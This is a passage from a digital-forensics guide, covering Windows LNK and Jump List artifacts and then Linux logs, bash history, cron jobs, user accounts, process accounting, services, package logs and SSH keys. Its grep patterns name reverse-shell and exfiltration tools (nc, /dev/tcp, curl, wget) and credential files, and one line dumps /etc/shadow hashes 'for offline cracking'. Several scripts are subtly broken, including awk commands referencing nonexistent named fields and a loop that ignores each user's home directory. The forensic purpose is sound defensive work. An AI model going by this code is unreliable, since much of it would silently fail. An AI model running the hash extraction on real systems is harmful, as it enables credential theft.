./LECmd -d ./lnk_files/ --csv . --csvf lnk.csv
# Check target paths against filesystem

# Extract deleted file metadata:
# - Original filename
# - Original location
# - File size
# - MAC times
# - Volume information
```

**Malware execution tracking:**

```bash
# Check LNK files in suspicious locations
./LECmd -d /mnt/win/Users/Public/ --csv . --csvf public_lnk.csv
./LECmd -d /mnt/win/Users/*/AppData/Local/Temp/ --csv . --csvf temp_lnk.csv

# Common malware indicators:
# - LNK files in temp directories
# - Targets in AppData\Local\Temp
# - Unusual target file extensions (.scr, .pif, .com)
# - Network paths to suspicious IPs
```

**Remote Desktop Connection tracking:**

```bash
# Recent RDP connections create LNK files
# Location: C:\Users\<user>\Documents\Default.rdp

# Also check Jump List for mstsc.exe
./JLECmd -f fb3b0dbfee58fac8.automaticDestinations-ms --csv . --csvf rdp_jumplist.csv

# Extract remote hostnames/IPs
```

**Timestomping detection:**

```bash
# Compare LNK timestamps with target file timestamps
# LNK preserves original MAC times even if target timestomped

# Extract both:
./LECmd -f document.lnk | grep "Target.*time"
stat target_file.docx

# Mismatches indicate timestamp manipulation
```

**User profile identification:**

```bash
# LNK files contain username in path
# Even if target on external drive

# Extract usernames from LNK files
awk -F',' '{print $source_file}' all_lnk.csv | grep -o 'Users/[^/]*' | sort -u

# Maps LNK files to specific user accounts
```

### Advanced Analysis

**Distributed Link Tracking:**

```bash
# DLT allows Windows to track moved files
# TrackerDataBlock contains:
# - Machine ID
# - Droid volume/file identifiers (GUIDs)

# Parse tracker data
./LECmd -f document.lnk | grep -A 5 "Tracker"

# Droid IDs can correlate files across systems
# Useful for tracking document movement in enterprise
```

**Temporal analysis:**

```bash
# Build timeline combining:
# 1. LNK creation time (file first accessed via shortcut)
# 2. LNK modification time (shortcut updated)
# 3. Target MAC times (actual file times)

# Script to extract all timestamps
./LECmd -d ./lnk_files/ --csv . --csvf lnk.csv
awk -F',' '{
    print $lnk_created, "LNK_CREATED", $source, $target
    print $lnk_modified, "LNK_MODIFIED", $source, $target
    print $target_created, "TARGET_CREATED", $source, $target
    print $target_modified, "TARGET_MODIFIED", $source, $target
}' lnk.csv | sort
```

**Link target validation:**

```bash
# Verify LNK targets still exist
./LECmd -d ./lnk_files/ --csv . --csvf lnk.csv

# Check targets against filesystem
awk -F',' '{print $target_path}' lnk.csv | while read target; do
    if [ ! -e "$target" ]; then
        echo "Missing: $target"
    fi
done

# Missing targets may indicate:
# - File deletion
# - External drive disconnected
# - Network share unavailable
# - Anti-forensic activity
```

**Related topics:** Windows file systems (NTFS forensics), MFT analysis, file carving, memory forensics (extracting recent file lists from RAM), network forensics (SMB traffic analysis for shared file access)

---

# Linux Forensics

## Linux Log File Analysis (/var/log)

Linux systems maintain comprehensive logs across multiple files in /var/log. These logs provide detailed timelines of system activity, security events, and user actions. Log retention and rotation policies affect forensic analysis depth.

### Syslog Analysis

Syslog is the central logging mechanism on Linux systems. The main syslog file and facility-specific logs record kernel messages, service events, and system activities.

**Examine main syslog file:**

```bash
# View syslog with timestamps
cat /var/log/syslog | head -50

# Filter syslog by date range
grep "Jan 15 " /var/log/syslog | head -20

# Extract specific facility (e.g., kernel messages)
grep "kernel:" /var/log/syslog | tail -20

# Identify common events: service starts, failures, permission issues
grep -i "error\|failed\|denied" /var/log/syslog | head -30
```

**Parse syslog timestamps for timeline construction:**

```bash
# Convert syslog timestamps to epoch for sorting and comparison
python3 << 'EOF'
import re
from datetime import datetime

syslog_file = "/var/log/syslog"
year = 2025  # Current year (syslog omits year)

with open(syslog_file, 'r') as f:
    for line in f:
        # Syslog format: Mmm DD HH:MM:SS hostname service
        match = re.match(r'(\w+ \d+ \d+:\d+:\d+)', line)
        if match:
            timestamp_str = match.group(1)
            try:
                dt = datetime.strptime(f"{year} {timestamp_str}", "%Y %b %d %H:%M:%S")
                epoch = int(dt.timestamp())
                print(f"{epoch} | {line.strip()}")
            except ValueError:
                pass
EOF
```

**Identify suspicious syslog patterns:**

```bash
# Failed login attempts
grep "Failed password" /var/log/syslog | awk '{print $11}' | sort | uniq -c

# Successful logins
grep "Accepted" /var/log/syslog | grep -E "password|publickey|ssh"

# Privilege escalation (sudo usage)
grep "sudo" /var/log/syslog | grep "COMMAND="

# Service restarts or failures
grep -E "systemd.*killed|service.*failed" /var/log/syslog
```

### auth.log and Authentication Analysis

The auth.log file (or /var/log/auth.log on Debian-based systems) records all authentication attempts, privilege escalations, and user session events.

**Examine authentication events:**

```bash
# View authentication attempts
tail -100 /var/log/auth.log | grep -E "sshd|su|sudo"

# Identify brute force attacks (multiple failed logins from same source)
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Extract successful logins with timestamps
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $9, $11}'

# Identify sudo command execution (privilege escalation)
grep "sudo.*COMMAND=" /var/log/auth.log | head -20
```

**Detect SSH key theft or unauthorized access:**

```bash
# Look for pub key authentication (often used by automated tools or attackers)
grep "Accepted publickey" /var/log/auth.log | awk '{print $11, $13}'

# Identify failed publickey attempts (possible brute force of keys)
grep "Failed publickey" /var/log/auth.log | awk '{print $11}' | sort | uniq -c

# Check for root login attempts
grep "root" /var/log/auth.log | grep -E "Failed|Accepted" | head -20
```

### kern.log (Kernel Messages)

Kernel logs record system-level events: memory access, module loading, device events, and privilege escalation attempts.

**Analyze kernel-level events:**

```bash
# View kernel log
cat /var/log/kern.log | tail -50

# Detect kernel module loading
grep "kernel.*module" /var/log/kern.log

# Identify kernel panics or critical errors
grep -i "panic\|oops\|segfault" /var/log/kern.log

# SELinux/AppArmor violations (security module denials)
grep -E "SELinux|apparmor" /var/log/kern.log | head -20

# Memory access violations
grep "segfault\|invalid opcode" /var/log/kern.log
```

### Application-Specific Logs

Application logs vary in location and format but provide detailed event histories for services.

**Apache/Nginx web server logs:**

```bash
# Apache error log
tail -50 /var/log/apache2/error.log

# Apache access log (includes requested resources and client IPs)
tail -50 /var/log/apache2/access.log

# Parse access log for suspicious requests
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10

# Identify web shell uploads or unusual resource requests
grep -E "\.php|\.jsp|shell|cmd\.exe" /var/log/apache2/access.log

# Nginx logs (similar structure)
tail -50 /var/log/nginx/access.log
```

**Database and service logs:**

```bash
# MySQL/MariaDB logs
tail -50 /var/log/mysql/error.log

# PostgreSQL logs
tail -50 /var/log/postgresql/postgresql.log

# Application-specific logs (check /var/log for directory listing)
ls -la /var/log/ | grep -E "\.log$"
```

### Log Rotation and Archival Analysis

Log files rotate (compress and archive) regularly, creating .1.gz, .2.gz files, etc. These archived logs extend forensic visibility.

**Examine rotated and compressed logs:**

```bash
# List all syslog files including compressed archives
ls -la /var/log/syslog* /var/log/syslog.*.gz

# Decompress and examine archived log
gunzip -c /var/log/syslog.1.gz | head -50

# Search across all syslog files (current and archived)
for log in /var/log/syslog{,.1.gz,.2.gz}; do
    if [[ $log == *.gz ]]; then
        gunzip -c "$log" | grep "pattern"
    else
        grep "pattern" "$log"
    fi
done

# Calculate log coverage timeline
ls -la /var/log/syslog* | awk '{print $6, $7, $8, $9}'
```

### Audit Framework (/var/log/audit)

The Linux Audit framework (auditd) provides detailed, configurable system activity logging. Audit logs capture system call activity, file access, and configuration changes.

**Examine audit logs:**

```bash
# View audit log
tail -50 /var/log/audit/audit.log

# Search for specific events (system call, file access, user action)
grep "syscall=" /var/log/audit/audit.log | head -20

# Identify file access events
grep "type=ACCESS" /var/log/audit/audit.log

# Extract executable events (processes launched)
grep "type=EXECVE" /var/log/audit/audit.log | head -10

# Identify privilege escalation events
grep "proctitle=" /var/log/audit/audit.log | grep -i "sudo\|su"
```

**Parse audit log with ausearch and aulast:**

```bash
# Search audit logs by event type
ausearch -k suspicious_file | tail -50

# Look for user login events
ausearch -m USER_LOGIN | tail -20

# Generate login report
aulast | head -20

# Search for system call patterns (potential privilege escalation)
ausearch -m SYSCALL | tail -20
```

---

## Bash History Examination

Bash history files record all commands executed by users. These files provide direct evidence of user actions and can reveal malicious commands, exploitation attempts, and data exfiltration.

### Bash History File Locations and Recovery

**Locate bash history files:**

```bash
# Current user's history
cat ~/.bash_history

# Other users' history (requires sufficient privileges)
cat /home/username/.bash_history
cat /root/.bash_history

# Find all .bash_history files on the system
find / -name ".bash_history" -type f 2>/dev/null

# Check for shell initialization files (may contain command history)
find / -name ".bashrc" -o -name ".bash_profile" -o -name ".zshrc" 2>/dev/null
```

**Recover deleted or overwritten history:**

```bash
# Bash history is typically a regular file; recovery similar to deleted file recovery
# Use grep on unallocated disk space to carve command patterns
strings /dev/sdX1 | grep -E "^(cd|cat|ls|rm|wget|curl|python|nc|bash)" | head -50

# If bash history was overwritten, extents or journal analysis may recover partial data
# [Inference] Tools like extundelete can recover deleted .bash_history files from ext file systems
extundelete --restore-all /dev/sdX1 --output-dir /tmp/recovered
```

### Command History Analysis

**Extract and analyze command history:**

```bash
# View all commands in chronological order
cat ~/.bash_history

# Filter for suspicious commands
cat ~/.bash_history | grep -iE "wget|curl|nc|ncat|bash|sh|python|perl|ruby|php"

# Identify commands accessing sensitive files
cat ~/.bash_history | grep -E "/etc/passwd|/etc/shadow|/root|\.ssh|\.aws"

# Search for compilation or execution of scripts
cat ~/.bash_history | grep -E "gcc|cc|g\+\+|make|chmod.*\+x"

# Look for network scanning or exploitation attempts
cat ~/.bash_history | grep -iE "nmap|metasploit|exploit|payload|reverse"
```

**Construct timeline from history entries:**

```bash
# [Inference] Bash history does not store timestamps by default
# Timestamps can be extracted if HISTTIMEFORMAT environment variable was set
cat ~/.bash_history | head -100

# If timestamps present (format: #timestamp):
python3 << 'EOF'
from datetime import datetime

with open('/root/.bash_history', 'r') as f:
    lines = f.readlines()
    for i, line in enumerate(lines):
        if line.startswith('#'):
            try:
                timestamp = int(line.strip()[1:])
                next_cmd = lines[i+1].strip() if i+1 < len(lines) else ""
                dt = datetime.fromtimestamp(timestamp)
                print(f"{dt} | {next_cmd}")
            except (ValueError, IndexError):
                pass
EOF
```

**Identify suspicious command chains:**

```bash
# Detect common exploitation patterns
cat ~/.bash_history | grep -E "cat.*flag|grep.*flag|ls.*flag"

# Identify privilege escalation attempts
cat ~/.bash_history | grep -iE "sudo.*-s|sudo su|su.*-c"

# Look for data exfiltration (piping sensitive data to network commands)
cat ~/.bash_history | grep -E "\|.*nc|\|.*curl|\|.*wget|\|.*tftp"

# Identify encryption/compression of data (potential data theft preparation)
cat ~/.bash_history | grep -E "tar.*z|zip|gzip|gpg|openssl"
```

### Shell History in Other Shells

**Alternative shells (zsh, fish, ksh):**

```bash
# Zsh history (typically ~/.zsh_history)
cat ~/.zsh_history

# Fish shell history (~/.local/share/fish/fish_history)
cat ~/.local/share/fish/fish_history

# Ksh history (~/.ksh_history)
cat ~/.ksh_history

# Search all user history files
for user in $(cut -d: -f1 /etc/passwd); do
    for history_file in ~/.bash_history ~/.zsh_history ~/.ksh_history; do
        if [[ -f "$history_file" ]]; then
            echo "=== $user: $history_file ==="
            cat "$history_file" | grep -iE "wget|curl|flag"
        fi
    done
done
```

### History Manipulation Detection

**Detect history file tampering:**

```bash
# Compare file modification times with system logs
stat ~/.bash_history

# Check for unusual gaps or patterns in history
# Attacker may delete specific commands, leaving gaps
wc -l ~/.bash_history

# Compare command count to file size (unusual ratio may indicate tampering)
du -b ~/.bash_history

# Look for manual history truncation
grep -c "history -c" ~/.bash_history

# Identify cleared history (history -c command resets HISTCMD but logs remain in syslog)
grep "history -c\|export HISTFILE=/dev/null" ~/.bash_history
```

---

## Cron Job Artifacts

Cron jobs provide automated task execution. Cron tables and logs reveal scheduled commands, potential malware persistence mechanisms, and system maintenance activities.

### Cron Table Files

**Locate and examine cron tables:**

```bash
# System-wide cron table
cat /etc/crontab

# User cron tables (stored in /var/spool/cron)
ls -la /var/spool/cron/crontabs/

# View specific user's cron table
crontab -u username -l  # Requires appropriate privileges

# Examine all cron jobs
for user in $(cut -d: -f1 /etc/passwd); do
    echo "=== $user ==="
    crontab -u "$user" -l 2>/dev/null || echo "No cron table"
done
```

**Parse cron table format:**

```bash
# Cron table format: minute hour day month weekday command
# Example entry:
# 0 2 * * * /usr/bin/backup.sh
# Run backup.sh every day at 2:00 AM

# Extract cron jobs and associated commands
python3 << 'EOF'
import re

def parse_crontab(filepath):
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            # Skip comments and empty lines
            if not line or line.startswith('#'):
                continue
            # Basic parsing (5 fields + command)
            parts = line.split(None, 5)
            if len(parts) >= 6:
                minute, hour, day, month, weekday, command = parts
                print(f"Schedule: {minute} {hour} {day} {month} {weekday}")
                print(f"Command: {command}\n")

parse_crontab('/etc/crontab')
EOF
```

### Cron Job Log Analysis

**Examine cron logs:**

```bash
# View cron daemon logs (typically in /var/log/syslog or /var/log/cron)
grep "CRON" /var/log/syslog | tail -50

# Extract specific cron events
grep "CRON\|cron" /var/log/syslog | grep -E "CMD|started|finished"

# Identify cron jobs that failed
grep "CRON" /var/log/syslog | grep -i "error\|failed"

# Timeline of cron job execution
grep "CRON" /var/log/syslog | awk '{print $1, $2, $3, $5, $6, $7, $8}'
```

**Detect suspicious cron jobs:**

```bash
# Look for cron jobs executing scripts from writable locations
grep -rE "^.*(/tmp|/var/tmp|/home.*)" /var/spool/cron/crontabs/

# Identify cron jobs using system shells or interpreters
grep -rE "bash|sh|python|perl|ruby" /var/spool/cron/crontabs/

# Check for reverse shells or network communication in cron commands
grep -rE "nc|netcat|/dev/tcp|curl.*http|wget" /var/spool/cron/crontabs/

# Search for persistence mechanisms
grep -rE "nohup|&|backgrounded" /var/spool/cron/crontabs/
```

### Anacron and at Jobs

**Examine anacron jobs (long-term scheduling):**

```bash
# Anacron configuration
cat /etc/anacrontab

# Anacron logs
grep "anacron" /var/log/syslog

# At daemon jobs (one-time scheduled tasks)
atq  # List pending at jobs (requires appropriate privileges)
```

### Cron Job Recovery

**Recover deleted cron tables:**

```bash
# Cron tables stored in /var/spool/cron/crontabs/ as regular files
# Use standard file recovery techniques
extundelete --restore-all /dev/sdX1 --output-dir /tmp/recovered

# Search for cron-like patterns in unallocated space
strings /dev/sdX1 | grep -E "^[0-9] [0-9] \*.*\/" | head -20
```

---

## User Account Analysis

User accounts provide execution context for commands and processes. Analyzing user data reveals account usage patterns, privilege levels, and potentially compromised accounts.

### /etc/passwd and /etc/shadow Analysis

**Examine user account database:**

```bash
# View user accounts
cat /etc/passwd

# Parse passwd format
python3 << 'EOF'
with open('/etc/passwd', 'r') as f:
    for line in f:
        parts = line.strip().split(':')
        if len(parts) == 7:
            username, _, uid, gid, gecos, home, shell = parts
            print(f"User: {username} | UID: {uid} | Shell: {shell}")
EOF

# Identify privileged accounts (UID 0)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Find service accounts (UIDs 1-999, typically)
awk -F: '$3 >= 1 && $3 < 1000 {print $1, $3}' /etc/passwd
```

**Examine password hashes:**

```bash
# View shadow file (requires root privileges)
cat /etc/shadow

# Parse shadow format
python3 << 'EOF'
with open('/etc/shadow', 'r') as f:
    for line in f:
        parts = line.strip().split(':')
        if len(parts) >= 2:
            username, password_hash = parts[0], parts[1]
            if password_hash == '*' or password_hash == '!':
                print(f"{username}: disabled")
            elif password_hash == '':
                print(f"{username}: no password (empty)")
            else:
                print(f"{username}: {password_hash[:30]}...")
EOF

# Identify users with empty passwords (security risk)
awk -F: '$2 == "" {print $1}' /etc/shadow

# Extract password hashes for offline cracking
awk -F: '{print $1":"$2}' /etc/shadow > /tmp/hashes.txt
```

### User Home Directory Analysis

**Examine user home directories:**

```bash
# List all home directories
ls -la /home/

# Check for hidden files and directories
find /home -name ".*" -type f 2>/dev/null | head -20

# Identify recently modified files (potential attacker activity)
find /home -type f -mtime -1 2>/dev/null | head -20

# Look for suspicious files in user directories
find /home -name "*.sh" -o -name "*.py" -o -name "*.exe" 2>/dev/null
```

**Analyze user configuration files:**

```bash
# SSH configuration
cat /home/username/.ssh/config
cat /home/username/.ssh/authorized_keys

# Bash/Shell initialization files
cat /home/username/.bashrc
cat /home/username/.bash_profile

# User cron jobs
crontab -u username -l 2>/dev/null

# Environment variables
grep -r "export" /home/username/.bashrc /home/username/.bash_profile 2>/dev/null
```

### Group Membership Analysis

**Examine user group memberships:**

```bash
# View group database
cat /etc/group

# Identify users in sudo group (privilege escalation vector)
grep "sudo" /etc/group

# List all group members
python3 << 'EOF'
with open('/etc/group', 'r') as f:
    for line in f:
        parts = line.strip().split(':')
        if len(parts) >= 4:
            groupname, _, gid, members = parts
            if members:
                print(f"{groupname} (GID {gid}): {members}")
EOF

# Check for users added to sensitive groups
grep -E "wheel|adm|docker|sudo" /etc/group
```

### User Login Activity

**Analyze login records:**

```bash
# Last login information
last -20

# Failed login attempts
lastb -20

# Extract login timeline
python3 << 'EOF'
import subprocess
from datetime import datetime

result = subprocess.run(['last', '-20'], capture_output=True, text=True)
for line in result.stdout.split('\n'):
    if line.strip():
        print(line)
EOF
```

---

## Process Accounting

Process accounting logs detailed information about every process executed on the system, including execution time, resource usage, and user context. This provides comprehensive activity tracking.

### Enabling and Examining Process Accounting

**Enable process accounting:**

```bash
# Check if accounting is enabled
accton

# Enable accounting (writes to /var/log/account/pacct by default)
sudo accton /var/log/account/pacct

# Disable accounting
sudo accton off
```

**Analyze accounting data:**

```bash
# lastcomm displays process accounting records
lastcomm | head -50

# Filter by user
lastcomm -u username | head -20

# Filter by command
lastcomm -c command_name | head -20

# Show last N entries
lastcomm -n 100 | tail -50

# Extract execution timeline
lastcomm | awk '{print $1, $NF}' | head -30
```

**Parse accounting binary file directly:**

```bash
# Accounting data is binary; convert to readable format
python3 << 'EOF'
import struct
import os
from datetime import datetime

def read_accounting(filepath):
    with open(filepath, 'rb') as f:
        # Process accounting record structure varies; depends on system
        # Typical: name (8 bytes), uid (2), gid (2), pid (2), ppid (2), 
        #          ctime (4), flags (2), exitcode (2)
        while True:
            record = f.read(32)  # Typical record size
            if not record:
                break
            if len(record) >= 16:
                name = record[0:8].rstrip(b'\x00').decode('ascii', errors='ignore')
                uid = struct.unpack('<H', record[8:10])[0]
                print(f"Process: {name} | UID: {uid}")

read_accounting('/var/log/account/pacct')
EOF
```

### Process Accounting Analysis for Forensics

**Reconstruct user actions from accounting logs:**

```bash
# Identify all commands executed by a user
lastcomm -u username | awk '{print $1}' | sort | uniq -c | sort -rn

# Timeline of user activity
lastcomm -u username | tail -50

# Identify suspicious or rarely-used commands
lastcomm | awk '{print $1}' | sort | uniq -c | sort -n | head -20
```

**Detect process execution patterns:**

```bash
# Look for compiler usage (potential malware compilation)
lastcomm -c gcc -c cc -c g++ | head -20

# Identify interpreters (script execution)
lastcomm -c python -c perl -c ruby -c sh | head -30

# Network tool usage
lastcomm -c nc -c wget -c curl -c telnet | head -20

# Privilege escalation commands
lastcomm -c sudo -c su | head -20
```

---

## System Service Analysis

Linux services provide background functionality. Analyzing service configuration, startup scripts, and execution logs reveals both legitimate services and persistent malware mechanisms.

### Systemd Service Analysis

**Examine service units:**

```bash
# List all services
systemctl list-units --type=service --all

# View service status
systemctl status servicename

# Show service configuration
systemctl cat servicename

# View service file directly
cat /etc/systemd/system/servicename.service
cat /lib/systemd/system/servicename.service
```

**Analyze service dependencies and execution:**

```bash
# Extract service startup order and dependencies
systemctl list-dependencies servicename

# Show service execution details (command, user, environment)
cat /etc/systemd/system/servicename.service | grep -E "ExecStart|User|Environment"

# Identify custom services (non-standard locations may indicate malware)
find /etc/systemd -name "*.service" -type f | xargs grep -l "ExecStart" | head -20
```

**Analyze service logs:**

```bash
# View service journal entries
journalctl -u servicename -n 50

# Service activity over time
journalctl -u servicename --no-pager | grep -E "Started|Stopped|failed"

# Extract service errors
journalctl -u servicename -p err
```

### Init Script Analysis (SysVinit)

**Examine init scripts (legacy systems):**

```bash
# Init scripts located in /etc/init.d/
ls -la /etc/init.d/ | head -20

# View init script
cat /etc/init.d/servicename

# Extract executable commands from init script
grep -E "start\(\)|stop\(\)" /etc/init.d/servicename
```

### Runlevel and Boot Target Analysis

**Analyze system runlevels:**

```bash
# Current runlevel
runlevel

# Services enabled at boot
chkconfig --list
update-rc.d -n servicename disable  # Check what would be disabled

# Examine boot configuration
cat /etc/default/grub
```

**Detect suspicious service startup:**

```bash
# Look for services starting from non-standard locations
find /etc/rc*.d -type l | xargs ls -l | grep -E "/tmp|/home|/var/tmp"

# Identify services running with unusual privileges
grep -r "User=" /etc/systemd/system/ | grep -v "User=root"

# Check for hidden or masked services
systemctl list-unit-files | grep -E "masked|indirect"
```

---

## Package Management Logs

Package management logs record software installation, removal, and updates. These logs reveal system modifications and potential malware installation vectors.

### APT/Dpkg Logs (Debian-Based Systems)

**Examine package installation history:**

```bash
# APT history log
cat /var/log/apt/history.log | tail -50

# Full history with timestamps
grep -E "Install:|Remove:|Upgrade:" /var/log/apt/history.log | head -30

# Parse APT history for specific packages
python3 << 'EOF'
import re
from datetime import datetime

with open('/var/log/apt/history.log', 'r') as f:
    current_line = ""
    for line in f:
        if line.startswith('Start-Date:'):
            if current_line:
                print(current_line + "\n")
            current_line = line.strip()
        else:
            current_line += " " + line.strip()

EOF
```

**Analyze package modifications:**

```bash
# List installed packages
dpkg -l | head -50

# Compare installed packages against package list at specific time
# [Inference] Requires baseline package lists from different time periods for comparison

# Search for suspicious or unfamiliar packages
dpkg -l | grep -iE "malware|rootkit|backdoor|trojan"

# Identify recently installed packages
ls -lat /var/cache/apt/archives/ | head -20
```

### YUM/RPM Logs (RedHat-Based Systems)

**Examine RPM package history:**

```bash
# YUM history log
cat /var/log/yum.log | tail -50

# RPM database queries
rpm -qa | head -50

# Check package signatures
rpm -qa --qf '%{NAME}-%{VERSION}-%{RELEASE} %{SIGPGP:pgpsig}\n' | grep -i "none\|nosignature"

# Query package installation time
rpm -qa --qf '%{NAME} %{INSTALLTIME}\n' | awk '{print $NF, $1}' | sort -rn | head -20
```

### Package Manager Forensics

**Detect unauthorized package installation:**

```bash
# Compare installed packages with approved baseline
# Create baseline during system hardening:
dpkg -l > /tmp/baseline_packages.txt

# Later, compare current state:
diff <(dpkg -l | awk '{print $2}' | sort) <(awk '{print $2}' /tmp/baseline_packages.txt | sort)

# Look for packages installed from suspicious repositories
apt-cache policy packagename

# [Inference] Tools like debsecan can identify vulnerable packages
debsecan --suite bullseye | grep -i "critical\|high"
```

**Examine package installation scripts:**

```bash
# Preinst and postinst scripts often contain installation logic
dpkg -c /var/cache/apt/archives/packagename.deb | grep -E "preinst|postinst"

# Extract and examine postinst script
ar x packagename.deb control.tar.gz
tar -xzf control.tar.gz postinst
cat postinst

# Search for suspicious patterns in installation scripts
grep -E "wget|curl|chmod.*\+x|/tmp|nc" postinst
```

---

## SSH Key and Configuration Analysis

SSH provides secure remote access and can be a vector for persistence, lateral movement, and data exfiltration. SSH configuration and key analysis reveals authentication mechanisms and potential compromises.

### SSH Key Examination

**Locate SSH keys:**

```bash
# User SSH keys
find /home -name ".ssh" -type d 2>/dev/null
ls -la ~/.ssh/

# System SSH keys (host keys)
ls -la /etc/ssh/ssh_host_*

# Identify all SSH key files on system
find / -name "*rsa*" -o -name "*dsa*" -o -name "*ecdsa*" -o -name "*ed25519*" 2>/dev/null | grep -E "\.pub|/\.ssh"
```

**Analyze SSH keys for forensic artifacts:**

```bash
# Extract SSH key fingerprints
ssh-keygen -l -f ~/.ssh/id_rsa.pub

# Compare key fingerprints across systems (identify lateral movement keys)
ssh-keygen -l -f /home/user/.ssh/id_rsa.pub
ssh-keygen -l -f /home/attacker/.ssh/authorized_keys

# Identify key type and algorithm
ssh-keygen -l -v -f ~/.ssh/id_rsa.pub

# Check key age and modification times
stat ~/.ssh/id_rsa
stat ~/.ssh/authorized_keys
```

### SSH Public Key Analysis

**Examine authorized_keys file:**

```bash
# View authorized SSH keys
cat ~/.ssh/authorized_keys

# Count authorized keys
wc -l ~/.ssh/authorized_keys

# Identify keys by fingerprint
python3 << 'EOF'
import subprocess
import os

authorized_keys = os.path.expanduser('~/.ssh/authorized_keys')
with open(authorized_keys, 'r') as f:
    for i, line in enumerate(f, 1):
        if line.strip() and not line.startswith('#'):
            # Extract key type and compute fingerprint
            parts = line.split()
            if len(parts) >= 2:
                key_type = parts[0]
                key_data = parts[1]
                print(f"Key {i}: {key_type}")
                # Comment often identifies the key origin
                if len(parts) > 2:
                    print(f"  Comment: {parts[2]}")
                print()
EOF

# Search for suspicious key comments (attacker keys often have identifying comments)
grep -E "@|attacker|backdoor|malware" ~/.ssh/authorized_keys
```

**Detect unauthorized key additions:**

```bash
# Compare authorized_keys across time periods
# [Inference] Requires baseline authorized_keys snapshots from earlier time
diff /tmp/authorized_keys_baseline ~/.ssh/authorized_keys

# Look for keys added by non-standard means
# Legitimate keys typically added via ssh-copy-id or manual configuration
# Check modification time of authorized_keys file
stat ~/.ssh/authorized_keys | grep -E "Modify|Change"

# Identify keys with unusual encoding or format
grep -v "^ssh-rsa\|^ssh-dss\|^ecdsa-sha2\|^ssh-ed25519" ~/.ssh/authorized_keys
```

### SSH Configuration Analysis

**Examine SSH server configuration:**

```bash
# View SSH daemon configuration
cat /etc/ssh/sshd_config

# Extract key configuration parameters
grep -v "^#\|^$" /etc/ssh/sshd_config | head -30

# Identify non-standard SSH ports (often used by attackers for persistence)
grep "Port " /etc/ssh/sshd_config

# Check authentication method configuration
grep -E "PubkeyAuthentication|PasswordAuthentication|PermitRootLogin" /etc/ssh/sshd_config
```

**Analyze SSH client configuration:**

```bash
# User SSH client config
cat ~/.ssh/config

# Identify jump hosts or proxies (may indicate lateral movement setup)
grep -E "ProxyCommand|ProxyJump" ~/.ssh/config

# Extract configured hosts
grep "^Host " ~/.ssh/config | awk '{print $2}'

# Identify port forwarding configurations (potential C2 tunneling)
grep "LocalForward\|RemoteForward" ~/.ssh/config
```

### SSH Log Analysis

**Examine SSH authentication logs:**

```bash
# SSH login attempts
grep "sshd" /var/log/auth.log | grep -E "Failed|Accepted" | tail -50

# Extract successful SSH logins with user and IP
grep "Accepted" /var/log/auth.log | grep sshd | awk '{print $1, $2, $3, $9, $11}' | head -20

# Identify failed public key authentication attempts
grep "Failed publickey" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# SSH key-based logins
grep "Accepted publickey" /var/log/auth.log | awk '{print $11, $13}' | head -20
```

**Detect SSH brute force and scanning:**

```bash
# Identify scanning activity (many failed logins from single IP)
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Extract attacker IPs and attempt counts
grep "sshd.*Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | awk '$1 > 10 {print}'

# Timeline of brute force attempts
grep "Failed password" /var/log/auth.log | head -30
```

### SSH Key-Based Persistence

**Identify SSH backdoors and persistence mechanisms:**

```bash
# Look for authorized_keys in unexpected locations
find /home /root -name "authorized_keys" -o -name "authorized_keys2" 2>/dev/null

# Check for suspicious SSH keys in system accounts
cat /home/*/\.ssh/authorized_keys | grep -v "^#" | wc -l

# Compare authorized_keys across multiple users (detect attacker key reuse)
python3 << 'EOF'
import os
import re

users = []
attacker_keys = {}

for home_dir in ['/root'] + [f'/home/{u}' for u in os.listdir('/home')]:
    auth_keys_file = f'{home_dir}/.ssh/authorized_keys'
    if os.path.exists(auth_keys_file):
        with open(auth_keys_file, 'r') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    parts = line.split()
                    if len(parts) >= 2:
                        key_fingerprint = parts[1][:20]  # Partial fingerprint
                        if key_fingerprint not in attacker_keys:
                            attacker_keys[key_fingerprint] = []
                        attacker_keys[key_fingerprint].append(home_dir)

# Identify keys reused across multiple users (indicator of compromise)
for key, users_list in attacker_keys.items():
    if len(users_list) > 1:
        print(f"Key reused across users: {users_list}")
EOF
```

**Analyze SSH ForceCommand and command restrictions:**

```bash
# Check for restricted SSH keys (ForceCommand limits what key can do)
grep "command=" ~/.ssh/authorized_keys

# Example: command="/home/user/restricted_script.sh" ssh-rsa AAAA...
# Attackers may use this to execute specific commands while maintaining key access

# Extract and examine forced commands
grep "command=" ~/.ssh/authorized_keys | sed 's/.*command="//' | sed 's/".*//'
```

### SSH Agent and Credential Forwarding

**Detect SSH agent abuse:**

```bash
# Check for SSH agent sockets (active SSH sessions)
ls -la /tmp/ssh-*/

# Identify SSH agent processes
ps aux | grep ssh-agent

# SSH forwarding configuration (agent forwarding risks key compromise)
grep "ForwardAgent" ~/.ssh/config

# Check SSH agent environment variables (identifies agent socket location)
env | grep SSH_AUTH_SOCK
```

**Analyze SSH connection logs for agent activity:**

```bash
# Look for agent forwarding in auth logs
grep "agent forwarding" /var/log/auth.log

# Identify X11 forwarding (potential for graphics-based attacks)
grep "X11" /var/log/auth.log
```

### Known SSH Attacks and Indicators

**Detect common SSH exploitation patterns:**

```bash
# Key extraction attacks (often leave multiple failed key attempts)
grep -c "Invalid user\|Failed publickey" /var/log/auth.log

# SSH tunnel creation (port forwarding setup)
grep "forwarding\|tunnel" /var/log/auth.log

# SSH key enumeration (attacker tests multiple keys against accounts)
grep "Failed publickey" /var/log/auth.log | wc -l

# Compromised keys used for lateral movement
# [Inference] Requires tracking key usage across multiple hosts
# Compare authorized_keys fingerprints across systems
```

**Identify SSH backdoors in configuration:**

```bash
# Backdoors often modify sshd_config to enable root login or change port
diff /tmp/sshd_config_baseline /etc/ssh/sshd_config

# Look for PAM (Pluggable Authentication Modules) modifications
grep -r "pam_" /etc/pam.d/

# Rootkit-based SSH backdoors often modify binary
# Compare sshd binary hash
sha256sum /usr/sbin/sshd > /tmp/sshd_baseline.txt
# Later compare: sha256sum -c /tmp/sshd_baseline.txt

# [Unverified] Tools like aide or tripwire can monitor SSH binary modifications
aide --check
```

